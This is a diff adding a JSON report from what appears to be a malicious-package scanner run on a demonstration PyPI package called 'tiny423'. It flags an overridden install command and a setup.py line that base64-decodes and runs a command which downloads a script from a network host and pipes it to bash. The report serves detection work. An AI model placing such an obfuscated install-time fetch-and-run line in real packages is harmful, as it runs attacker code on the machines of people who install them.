@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:25",
+                "code": "setuptools.setup(\n    name = \"tiny423\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n  ...\n    },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:14",
+                "code": "    os.system(b64d(\"Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Rlc3QudHh0IHwgYmFzaAo=\"))\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/tiny423-1.0.0"
+}
